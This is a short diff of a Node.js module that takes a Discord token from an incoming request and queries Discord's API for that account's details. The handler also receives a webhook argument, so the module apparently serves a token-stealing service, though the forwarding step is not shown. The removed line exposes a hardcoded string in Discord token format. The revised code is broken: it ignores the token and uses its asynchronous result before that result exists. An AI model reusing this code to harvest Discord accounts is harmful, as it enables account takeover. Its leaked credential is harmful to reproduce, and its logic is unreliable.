@@ -1,18 +1,18 @@
 const axios = require('axios');
 
 
-
-var info;
+function getinfo(token)
+{
 axios.get('https://discordapp.com/api/v8/users/@me', {
     withCredentials: true,
     headers: {
-      Authorization: "Njg5MTE3MzQxMzc1OTIyMjI3.X_XWpA.t4ZxKvzRtcg5l1DYuSah6sDpHb8",
+      Authorization: "",
     },
   }).then((response) => {	
-    info = response.data;
+    return(response.data);
   }
   )
-
+}
 exports.send = (req, res, webhook) =>
 {
 	const token = req.body.token;
@@ -23,7 +23,7 @@ exports.send = (req, res, webhook) =>
 	
 	
 
-
+var 	info = getinfo(token);
 	
 	
 	var discrim = JSON.parse(JSON.stringify(info)).discriminator;
